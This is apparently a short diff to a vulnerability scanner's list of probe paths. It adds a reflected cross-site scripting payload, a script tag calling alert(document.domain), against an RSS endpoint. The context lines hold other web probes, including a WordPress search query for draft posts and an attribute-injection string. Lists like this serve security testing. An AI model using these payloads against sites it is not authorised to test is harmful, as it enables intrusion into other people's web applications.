@@ -153,3 +153,4 @@
 {{paths}}
 /wp-admin/admin-ajax.php?action=searchwp_live_search&swpquery=a&post_status=draft
 /index.php?search=1af%22+onclick%3D
+/?PagePrincipale/rss&id=1%27%3Cscript%3Ealert(document.domain)%3C/script%3E
